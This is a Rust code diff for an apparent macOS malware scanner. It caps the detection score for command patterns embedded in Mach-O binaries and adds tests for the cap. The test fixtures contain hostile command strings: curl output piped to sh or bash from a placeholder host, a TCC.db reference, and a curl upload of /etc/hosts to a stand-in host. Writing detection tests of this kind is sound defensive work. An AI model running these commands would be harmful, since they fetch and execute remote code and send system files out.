@@ -15,6 +15,11 @@ const NAME_WEIGHT: i32 = 2;
 /// Notify alone (§5.2).
 const NAME_FLOOR_CAP: i32 = 5;
 
+/// Cap on the combined intent-pattern score in a Mach-O: commands embedded
+/// in a compiled program are data it may print or run, so they corroborate
+/// and cannot reach Notify alone (§5.2, #191).
+const MACHO_PATTERN_CAP: i32 = crate::scan::MEDIUM_SCORE_THRESHOLD - 1;
+
 /// A bare name that only corroborates intent patterns.
 struct Marker {
     needle: &'static str,
@@ -779,7 +784,7 @@ fn scan_window(bytes: &[u8], is_first: bool, is_last: bool, hits: &mut Hits) {
 }
 
 /// Total weight and notes (patterns first, then counted names) for `hits`.
-/// Names count only when the resident content reads as script/text.
+/// Patterns in a Mach-O are capped; names count only in script/text.
 fn score(hits: &Hits, ctx: &ScanContext) -> (i32, Vec<&'static str>) {
     let mut weight = 0;
     let mut notes: Vec<&'static str> = Vec::new();
@@ -790,6 +795,9 @@ fn score(hits: &Hits, ctx: &ScanContext) -> (i32, Vec<&'static str>) {
     {
         weight += p.weight;
         notes.push(p.note);
+    }
+    if weight > MACHO_PATTERN_CAP && ctx.macho().is_macho {
+        weight = MACHO_PATTERN_CAP;
     }
     // Binaries name APIs legitimately; only script/text counts names.
     let names_count = hits.markers.iter().any(|&h| h)
@@ -1475,6 +1483,27 @@ mod tests {
     fn patterns_still_score_in_a_binary() {
         let bin = binary_with(b"\0curl -s http://x | sh\0dlopen\0");
         assert_eq!(weight_of("x.bin", &bin), Some(15));
+    }
+
+    fn macho_with(tail: &[u8]) -> Vec<u8> {
+        let mut c = std::fs::read(
+            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
+                .join("fixtures/benign/tiny_hello_arm64"),
+        )
+        .expect("fixture");
+        c.extend_from_slice(tail);
+        c
+    }
+
+    #[test]
+    fn patterns_in_a_macho_are_capped() {
+        let one = macho_with(b"\0curl -fsSL https://x/install.sh | bash\0");
+        assert_eq!(weight_of("x", &one), Some(MACHO_PATTERN_CAP));
+        // TCC.db and an upload: 10 + 10, capped.
+        let two = macho_with(b"\0TCC.db\0curl -F f=@/etc/hosts http://x\0");
+        assert_eq!(weight_of("x", &two), Some(MACHO_PATTERN_CAP));
+        // Below the cap, a pattern keeps its own weight.
+        assert_eq!(weight_of("x", &macho_with(b"\0TCC.db\0")), Some(10));
     }
 
     #[test]
